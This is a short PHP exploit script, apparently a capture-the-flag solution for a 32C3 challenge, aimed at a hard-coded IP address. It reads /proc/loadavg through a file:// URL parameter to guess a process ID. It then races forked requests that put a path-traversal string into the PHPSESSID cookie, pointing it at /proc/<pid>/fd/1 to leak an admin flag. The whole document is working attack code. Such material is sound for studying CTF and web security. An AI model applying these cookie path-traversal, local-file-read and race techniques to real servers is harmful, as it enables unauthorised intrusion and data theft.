<?php
/*
** 32c3-ITD exploit
** run with:
** while true; do php itdpen.php; done
** ( yeah php :> )
** @fearg0t
*/
  $pid = file_get_contents('http://136.243.194.59/posts/?p=file://localhost/proc/loadavg');
  preg_match('/[0-9]+\/[0-9]+ ([0-9]+)/',$pid,$m);
  $pid = intval($m[1])+6; // Tweak this (higher values for high server load, 1 for localhost)
  echo '.';
  $p = pcntl_fork();
  if ($p == -1) {
       die('could not fork');
  }
  else if ($p)
  {
      pcntl_fork();
      $result = file_get_contents('http://136.243.194.59/Ube3rS4xureAdmin/?act=get&key=123123');
      if(preg_match('/flag/',$result,$m) === 1){
	      echo "\n";
        echo $result;
      	echo "Ctrl-c";
      }
  }
  else
  {
       $opts = array(
        'http'=>array(
          'method'=>"GET",
          'header'=>"Accept-language: en\r\n" .
                    "Cookie: PHPSESSID=/../../../../../../../../../../../proc/".$pid."/fd/1\r\n"
        )
      );
     // usleep(500);
      $context = stream_context_create($opts);
      $file = file_get_contents('http://136.243.194.59/Ube3rS4xureAdmin/?lang=X', false, $context);
  }